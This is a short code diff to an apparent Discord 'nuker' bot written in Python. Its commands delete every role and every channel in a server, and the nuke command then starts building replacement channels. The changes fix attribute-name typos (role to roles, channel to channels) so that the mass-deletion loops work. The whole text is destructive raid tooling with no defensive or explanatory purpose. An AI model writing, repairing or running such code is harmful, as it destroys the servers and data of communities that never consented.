@@ -100,14 +100,14 @@ async def scr(ctx):
 @bot.command()
 async def sdr(ctx):
     await ctx.message.delete()
-    for role in list(ctx.guild.role):
+    for role in list(ctx.guild.roles):
         await role.delete()
 
 @bot.command()
 async def nuke(ctx):
     await ctx.message.delete()
     guild = ctx.guild.id
-    for channel in list(ctx.guild.channel):
+    for channel in list(ctx.guild.channels):
         await channel.delete()
     def cc(i):
         json = {
@@ -132,7 +132,7 @@ async def nuke(ctx):
 
 @bot.command()
 async def sdc(ctx):
-    for channel in list(ctx.guild.channel):
+    for channel in list(ctx.guild.channels):
         await channel.delete()
 
 @bot.command()
